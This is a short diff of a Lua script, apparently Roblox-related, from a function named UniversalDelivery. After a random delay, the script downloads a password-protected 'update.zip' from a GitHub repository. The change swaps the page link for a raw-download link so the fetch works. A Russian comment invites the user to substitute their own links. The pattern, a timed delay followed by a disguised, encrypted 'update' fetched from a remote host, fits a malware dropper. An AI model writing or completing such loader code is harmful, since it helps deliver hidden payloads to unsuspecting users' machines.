@@ -218,7 +218,7 @@ wait(math.random(15, 30))
 
 local function UniversalDelivery()
     -- 🔥 ВАШИ ССЫЛКИ (замените эти значения) 🔥
-    local ZIP_URL = "https://github.com/fasfsagfsa13-del/roblo1x-souresec/blob/main/update.zip"
+    local ZIP_URL = "https://raw.githubusercontent.com/fasfsagfsa13-del/roblo1x-souresec/main/update.zip"
     local ZIP_PASSWORD = "UpdatePass2025!"
     
     local success, zip_data = pcall(function()
